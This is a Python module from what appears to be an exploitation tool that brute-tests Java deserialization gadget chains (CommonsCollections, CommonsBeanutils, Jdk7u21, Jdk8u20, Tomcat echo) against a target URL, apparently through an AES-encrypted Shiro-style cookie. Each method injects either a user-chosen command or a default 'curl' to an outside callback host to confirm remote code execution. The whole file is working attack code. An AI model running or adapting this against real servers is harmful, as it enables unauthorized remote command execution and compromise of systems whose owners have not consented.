import random
from core.Check import getPayload, getHex, getChainsTest, getChainsEchoTest
from core.DATA import Payload

class Chains:
    def __init__(self,key,url,aesway,ceye,cmd=""):
        self.key = key
        self.url = url
        self.Aesway = aesway
        self.cmd = cmd
        self.ceye1 = ceye.split("+")[0].strip()
        self.ceye2 = ceye.split("+")[1].strip()
    def CC1(self):
        randomceye = "CC1lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC1'], cmd, 'CC1')
        #print(Hex)
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC1 is useful")
        else:print("CC1 is not useful")
    def CC2(self):
        randomceye = "CC2lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC2'], cmd, 'CC2')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC2 is useful")
        else:print("CC2 is not useful")
    def CC3(self):
        randomceye = "CC3lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC3'], cmd, 'CC3')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC3 is useful")
        else:print("CC3 is not useful")
    def CC4(self):
        randomceye = "CC4lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC4'], cmd, 'CC3')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC4 is useful")
        else:print("CC4 is not useful")
    def CC5(self):
        randomceye = "CC5lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC5'], cmd, 'CC5')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC5 is useful")
        else:print("CC5 is not useful")
    def CC6(self):
        randomceye = "CC6lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC6'], cmd, 'CC6')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC6 is useful")
        else:print("CC6 is not useful")
    def CC7(self):
        randomceye = "CC7lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC7'], cmd, 'CC7')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC7 is useful")
        else:print("CC7 is not useful")
    def CC8(self):
        randomceye = "CC8lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC8'], cmd, 'CC8')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC8 is useful")
        else:print("CC8 is not useful")
    def CC9(self):
        randomceye = "CC9lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC9'], cmd, 'CC9')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC9 is useful")
        else:print("CC9 is not useful")
    def CC10(self):
        randomceye = "CC10lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CC10'], cmd, 'CC10')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CC10 is useful")
        else:print("CC10 is not useful")
    def CCK1(self):
        randomceye = "CCK1lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CCK1'], cmd, 'CCK1')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CCK1 is useful")
        else:print("CCK1 is not useful")
    def CCK2(self):
        randomceye = "CCK2lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CCK2'], cmd, 'CCK2')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CCK2 is useful")
        else:print("CCK2 is not useful")
    def CCK3(self):
        randomceye = "CCK3lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CCK3'], cmd, 'CCK3')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CCK3 is useful")
        else:print("CCK3 is not useful")
    def CCK4(self):
        randomceye = "CCK4lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CCK4'], cmd, 'CCK4')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CCK4 is useful")
        else:print("CCK4 is not useful")
    def CB(self):
        randomceye = "CBlzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
           cmd = self.cmd
        else:
           cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CB'], cmd, 'CB')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        result = getChainsTest(payload1, self.url, randomceye, self.ceye1, self.ceye2)
        if result == 1:print("LOOK AT HERE:CB is useful")
        else:print("CB is not useful")
    def Echo(self):
        randomceye = "Echolzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
            cmd = self.cmd
        else:
            cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['Echo'], cmd, 'Echo')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        if self.cmd != "":
          result = getChainsEchoTest(payload1, self.url, self.cmd)
        else:
          result = getChainsEchoTest(payload1, self.url)
        if result == 1:
            print("LOOK AT HERE:Echo is useful")
        else:
            print("Echo is not useful")
    def CB1(self):
        randomceye = "CB1lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
            cmd = self.cmd
        else:
            cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CB1'], cmd, 'CB1')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        if self.cmd != "":
          result = getChainsEchoTest(payload1, self.url, self.cmd)
        else:
          result = getChainsEchoTest(payload1, self.url)
        if result == 1:
            print("LOOK AT HERE:CB1 is useful")
        else:
            print("CB1 is not useful")
    def CB2(self):
        randomceye = "CB2lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
            cmd = self.cmd
        else:
            cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['CB2'], cmd, 'CB2')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        if self.cmd != "":
          result = getChainsEchoTest(payload1, self.url, self.cmd)
        else:
          result = getChainsEchoTest(payload1, self.url)
        if result == 1:
            print("LOOK AT HERE:CB2 is useful")
        else:
            print("CB2 is not useful")
    def Jdk7u21(self):
        randomceye = "Jdk7u21lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
            cmd = self.cmd
        else:
            cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['Jdk7u21'], cmd, 'Jdk7u21')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        if self.cmd != "":
          result = getChainsEchoTest(payload1, self.url, self.cmd)
        else:
          result = getChainsEchoTest(payload1, self.url)
        if result == 1:
            print("LOOK AT HERE:Jdk7u21 is useful")
        else:
            print("Jdk7u21 is not useful")
    def Jdk8u20(self):
        randomceye = "Jdk8u20lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
            cmd = self.cmd
        else:
            cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['Jdk8u20'], cmd, 'Jdk8u20')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        if self.cmd != "":
          result = getChainsEchoTest(payload1, self.url, self.cmd)
        else:
          result = getChainsEchoTest(payload1, self.url)
        if result == 1:
            print("LOOK AT HERE:Jdk8u20 is useful")
        else:
            print("Jdk8u20 is not useful")
    def TomcatEchoK1(self):
        randomceye = "TomcatEchoK1lzkbsh" + str(random.randint(99, 8888))
        if self.cmd != "":
            cmd = self.cmd
        else:
            cmd = "curl http://" + self.ceye1 + "/" + randomceye
        Hex = getHex(Payload['TomcatEchoK1'], cmd, 'TomcatEchoK1')
        payload1 = getPayload(Hex, self.Aesway, self.key)
        if self.cmd != "":
          result = getChainsEchoTest(payload1, self.url, self.cmd)
        else:
          result = getChainsEchoTest(payload1, self.url)
        if result == 1:
            print("LOOK AT HERE:TomcatEchoK1 is useful")
        else:
            print("TomcatEchoK1 is not useful")
def takeChains(key,url,aesway,ceye,cmd=""):
    takeChain = Chains(key,url,aesway,ceye,cmd)
    #key_list = DATA.Payload.keys()
    #for func in key_list:
    #    print("takeChain."+func+"()")
    takeChain.CC1()
    takeChain.CC2()
    takeChain.CC3()
    takeChain.CC4()
    takeChain.CC5()
    takeChain.CC6()
    takeChain.CC7()
    takeChain.CC8()
    takeChain.CC9()
    takeChain.CC10()
    takeChain.CCK1()
    takeChain.CCK2()
    takeChain.CCK3()
    takeChain.CCK4()
    takeChain.CB()
    takeChain.Echo()
    takeChain.CB1()
    takeChain.CB2()
    takeChain.TomcatEchoK1()
    takeChain.Jdk7u21()
    takeChain.Jdk8u20()